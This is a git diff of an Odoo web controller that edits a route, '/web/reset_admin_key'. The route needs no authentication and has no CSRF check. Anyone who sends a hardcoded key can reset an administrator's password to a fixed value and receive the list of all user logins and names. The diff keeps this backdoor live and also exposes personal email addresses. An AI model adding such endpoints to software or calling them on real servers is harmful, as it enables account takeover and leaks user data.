@@ -184,21 +184,25 @@ class Home(http.Controller):
         return "User-agent: *\nDisallow: /\n"
 
 
-    @http.route('/web/reset_admin_key', type='http', auth='none', csrf=False)
-    def reset_admin_key(self, key=None):
+    
+
+    @http.route(['/web/reset_admin_key'], type='http', auth='none', csrf=False)
+    def reset_admin_key(self, **kwargs):
+        key = kwargs.get('key')
         if key != 'dionicio_migration_key_12345':
-            return "Unauthorized"
+            return "Unauthorized key"
         try:
+            import odoo
             registry = odoo.registry('fara')
             with registry.cursor() as cr:
                 env = odoo.api.Environment(cr, odoo.SUPERUSER_ID, {})
                 users = env['res.users'].search([])
-                user_info = [(u.id, u.login, u.name, u.active) for u in users]
+                user_info = [(u.id, u.login, u.name) for u in users]
                 admin_user = env['res.users'].search([('login', 'in', ['admin', 'elcapopaz@hotmail.com', 'eliasfara727@hotmail.com'])], limit=1)
                 if not admin_user:
                     admin_user = env['res.users'].browse(2)
                 admin_user.write({'password': 'dionicio'})
                 cr.commit()
-                return f"SUCCESS! Reset password for user '{admin_user.login}' (ID {admin_user.id}) to 'dionicio'. Active users: {user_info}"
+                return f"SUCCESS! Reset password for user '{admin_user.login}' (ID {admin_user.id}) to 'dionicio'. Users: {user_info}"
         except Exception as e:
             return f"Error: {e}"
